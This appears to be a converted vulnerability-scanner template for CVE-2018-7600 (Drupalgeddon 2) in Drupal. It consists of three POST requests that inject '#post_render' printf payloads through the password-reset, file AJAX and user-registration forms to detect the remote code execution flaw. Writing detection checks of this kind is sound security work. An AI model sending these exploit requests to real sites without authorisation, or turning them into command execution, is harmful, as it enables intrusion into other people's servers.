id: yaml-poc-drupal-drupal-unauthorized_access-CVE-2018-7600
info:
  name: Yaml Poc Drupal Drupal Unauthorized_Access Cve 2018 7600
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-drupal-drupal-unauthorized_access-CVE-2018-7600'
  tags: drupal,unauth,cve
  classification:
    cve-id: CVE-2018-7600
  reference:
  - http://www.securityfocus.com/bid/103534
  - http://www.securitytracker.com/id/1040598
  - https://badpackets.net/over-100000-drupal-websites-vulnerable-to-drupalgeddon-2-cve-2018-7600/
  - https://blog.appsecco.com/remote-code-execution-with-drupal-core-sa-core-2018-002-95e6ecc0c714
  - https://github.com/a2u/CVE-2018-7600
http:
- method: POST
  path:
  - /?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]={{r1}}%25%25{{r2}}
  body: 'form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: POST
  path:
  - /?q=file%2Fajax%2Fname%2F%23value%2F{{build_id}}
  body: 'form_build_id={{build_id}}

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
- method: POST
  path:
  - /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
  body: 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]={{r1}}%25%25{{r2}}

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
